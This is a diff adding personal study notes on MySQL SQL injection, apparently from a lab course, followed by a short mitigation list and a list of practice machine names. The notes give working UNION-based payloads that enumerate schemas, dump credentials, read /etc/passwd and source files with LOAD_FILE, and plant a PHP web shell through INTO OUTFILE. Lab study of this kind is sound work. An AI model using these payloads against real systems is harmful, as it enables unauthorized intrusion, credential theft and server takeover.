@@ -458,3 +458,300 @@ How to recognize MySQL
 |SELECT @@version |	When we have full query output 	| MySQL Version 'i.e. 10.3.22-MariaDB-1ubuntu1' 	| In MSSQL it returns MSSQL version. Error
 |SELECT POW(1,1)  |	When we only have numeric output| 	1 						| Error with other DBMS
 |SELECT SLEEP(5)  |	Blind/No Output 		|Delays page response for 5 seconds and returns 0. 	| Will not delay response with other DBMS
+
+
+## INFORMATION_SCHEMA Database
+
+We need
+
+* List of databases
+* List of tables within each database
+* List of columns within each table
+
+Information_schema contains metada about DBMS
+
+So, to reference a table present in another DB, we can use the dot ‘.’ operator
+
+```
+SELECT * FROM my_database.users;
+```
+
+## SCHEMATA
+The table SCHEMATA in the INFORMATION_SCHEMA database contains information about all databases on the server. It is used to obtain database names so we can then query them. The SCHEMA_NAME column contains all the database names currently present.
+```
+SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
+
+cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
+cn' UNION select 1,database(),2,3-- -
+```
+
+## TABLES
+https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.html
+
+To get tables from information_schema
+```
+cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
+```
+```
+Note how we replaced the numbers '2' and '3' with 'TABLE_NAME' and 'TABLE_SCHEMA', to get the output of both columns in the same query.
+
+Add a (where table_schema='dev') condition to only return tables from the 'dev' database, otherwise we would get all tables in all databases, which can be many.
+```
+
+## COLUMN
+https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html
+
+The COLUMN_NAME, TABLE_NAME, and TABLE_SCHEMA columns can be used to achieve this.
+
+```
+cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
+```
+
+## Data
+```
+cn' UNION select 1, username, password, 4 from dev.credentials-- -
+```
+Remember
+```
+Don't forget to use the dot operator to refer to the 'credentials' in the 'dev' database, as we are running in the 'ilfreight' database, as previously discussed.
+```
+
+
+
+Ex:
+```
+as'
+as' order by 4-- 
+as' union select 'a', 'b', 'c', 'd'-- 
+as' union select 'a', @@version, 'c', 'd'-- 
+as' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- 
+as' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- 
+as' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- 
+as' UNION select 1,username,password,4 from dev.credentials-- 
+```
+
+![alt text](image.png)
+
+
+# Reading Files
+
+In MySQL, the DB user must have the FILE privilege to load a file's content into a table and then dump data from that table and read files.
+
+## DB User
+
+Which user we are
+* SELECT USER()
+* SELECT CURRENT_USER()
+* SELECT user from mysql.user
+
+so in example from previous union:
+* as' UNION SELECT 1, user(), 3, 4-- 
+
+or 
+
+* as' UNION SELECT 1, user, 3, 4 from mysql.user-- -
+
+## User Privileges
+
+* SELECT super_priv FROM mysql.USER
+* as' UNION SELECT 1, super_priv, 3,4 from mysql.USER-- 
+if we have more users
+* as' UNION SELECT 1, super_priv, 3,4 from mysql.USER where user="xyz"-- 
+
+Query return Y if TRUE
+
+#### Dump other privileges directly from schema
+```
+as' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- 
+
+or
+
+as' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- 
+```
+We see that the FILE privilege is listed
+
+## LOAD_FILE
+If we have privileges for read file we can use:
+
+```
+SELECT LOAD_FILE('/etc/passwd');
+
+or in union based
+
+as' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- 
+```
+Note
+```
+We will only be able to read the file if the OS user running MySQL has enough privileges to read it.
+```
+
+## Another Example
+
+We know that the current page is search.php. The default Apache webroot is /var/www/html. Let us try reading the source code of the file at /var/www/html/search.php.
+
+```
+as' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- 
+```
+
+
+# Writing Files
+## Write File Privileges
+To write files user need:
+
+
+* User with FILE privilege enabled
+* MySQL global secure_file_priv variable not enabled
+* Write access to the location we want to write to on the back-end server
+
+Check if the MySQL database has that privilege. This can be done by checking the secure_file_priv global variable
+
+## secure_file_priv
+https://mariadb.com/kb/en/server-system-variables/#secure_file_priv
+
+Find out the value of secure_file_priv. 
+Within MySQL, we can use the following query to obtain the value of this variable:
+```
+SHOW VARIABLES LIKE 'secure_file_priv';
+```
+https://dev.mysql.com/doc/refman/5.7/en/information-schema-variables-table.html
+
+```
+SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
+
+or 
+
+as' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- 
+```
+![alt text](image-1.png)
+Empty result of secure_file_priv value, meaning that we can read/write files to any location.
+
+## SELECT INTO OUTFILE
+We can use it for export data to files which we can read
+
+```
+SELECT * from users INTO OUTFILE '/tmp/credentials';
+```
+
+cat /tmp/credentials
+
+It is also possible to directly SELECT strings into files
+
+```
+SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
+```
+
+Tip 
+```
+Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.
+```
+
+## Writing Files through SQL Injection
+```
+select 'file written successfully!' into outfile '/var/www/html/proof.txt'
+```
+
+```
+as' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- 
+```
+
+
+## Writing a Web Shell
+```
+as' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- 
+http://94.237.58.4:43948/shell.php?0=id
+```
+
+# Mitigating SQL Injection
+
+* Input Sanitization
+* Input Validation
+* User Privileges
+* Web Application Firewall
+* Parameterized Queries
+
+
+
+# Machines
+* Sneaky M
+* Holiday H
+* Europa M
+* Charon H
+* Enterprise M
+* Nightmare I
+* Falafel H
+* Rabbit I
+* Fighter I
+* SecNotes M
+* Oz H
+* Giddy M
+* RedCross M
+* Help E
+* FluJab H
+* Unattended M
+* Writeup E
+* Jarvis M
+* Scavenger H
+* Zetta H
+* Bankrobber I
+* AI M
+* Control H
+* Fatty I
+* Multimaster I
+* Magic M
+* Cache M
+* Intense H
+* Unbalanced H
+* Breadcrumbs H
+* Proper H
+* CrossFitTwo I
+* Toolbox E
+* Monitors H
+* Spider H
+* Writer M
+* EarlyAccess H
+* Validation E
+* Overflow H
+* Union M
+* Pandora E
+* GoodGames E
+* Seventeen H
+* StreamIO M
+* Trick E
+* Faculty M
+* Shoppy E
+* Download H
+* Health M
+* Intentions H
+* MetaTwo E
+* PC E
+* Phoenix H
+* Shared M
+* Soccer E
+* Socket M
+* Vessel H
+* Devzat M
+* SwagShop E
+* Clicker M
+* Altered H
+* PikaTwoo I
+* Bookworm I
+* Monitored M
+* Usage E
+* Freelancer H
+* Blazorized H
+* Resource H
+* Lantern H
+* MonitorsThree M
+* Yummy H
+ 
+# Fortresses
+* Jet
+* Context
+* AWS
+
+# Prolabs
+* RastaLabs I
+* Offshore I
+* Dante I
+* APTLabs A
+* Alchemy I
